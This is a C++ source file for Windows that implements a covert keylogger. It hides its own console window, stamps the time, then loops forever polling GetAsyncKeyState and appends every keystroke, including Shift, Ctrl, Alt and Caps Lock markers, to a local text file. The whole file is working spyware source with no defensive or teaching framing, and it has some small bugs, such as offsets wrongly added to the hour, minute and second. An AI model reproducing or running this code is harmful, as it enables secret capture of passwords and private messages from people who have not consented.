#include <iostream>
#include <fstream>
#include<windows.h>
#include<bits/stdc++.h>
#include <ctime>

//file name
#define FIEL_NAME "text.txt"
//add time 
std::string addTime() {
	time_t Ntime = time(0);
	tm *local_time = localtime(&Ntime);
	std::string str;
	str+=std::to_string(local_time->tm_year + 1900);
	str+=std::to_string(local_time->tm_mon+1);
	str+=std::to_string(local_time->tm_mday);
	str+=std::to_string(local_time->tm_hour+1);
	str+=std::to_string(local_time->tm_min+1);
	str+=std::to_string(local_time->tm_sec+1);
	return str;
}
//save data into file
void saveData(std::string data) {
	std::fstream file;

	//open file
	file.open(FIEL_NAME, std::ios::app);

	//write into file
	file<<data;

	//close file
	file.close();
}

//translate special key into string
std::string translateSecialKey(int key) {
	std::string result;

	switch(key)
	{
		case VK_SPACE:
			result = " ";
			break;
		case VK_RETURN:
			result = "\n";
			break;
		case VK_BACK:
			result = "\b";
			break;
		case VK_CAPITAL:
			result = "[CAPS_LOCK]";
			break;
		case VK_SHIFT:
			result = "[SHIFT]";
			break;
		case VK_TAB:
			result = "[TAB]";
			break;
		case VK_CONTROL:
			result = "[CTRL]";
			break;
		case VK_MENU:
			result = "[ALT]";
			break;
		default:
			break;
	}
	return result;
}
int main ()
{
	int specialKeyArray[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB, VK_CONTROL, VK_MENU, VK_CAPITAL};
	std::string specialKeyChar;
	bool isSpecialKey;


	//hide terminal window
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);
	//save the time 
	saveData(addTime());
	//loop forever
	while(true) {
		//loop through each key
		for(int key = 0; key<=190; key++){
			//check key is pressed
			if(GetAsyncKeyState(key)==-32767){
				//key pressed
				//check if the key is special or not
				isSpecialKey = std::find(std::begin(specialKeyArray),std::end(specialKeyArray),key) != std::end(specialKeyArray);
				if(isSpecialKey){
					//need to translate it
					specialKeyChar = translateSecialKey(key);
					//save data 
					saveData(specialKeyChar);
				} else {
					if(key>=96 && key <=106){
						saveData(std::to_string(key-96));
					} else {
						//check if is uppercase or lowercase
						if(GetKeyState(VK_CAPITAL)){
							// CAPSLOCK is on
							saveData(std::string(1,(char)key));
						}else{
							// CAPSLOCK is off
							saveData(std::string(1,(char)std::tolower(key)));
						}
					}
				}
			}
		}
	}
	return 0;
}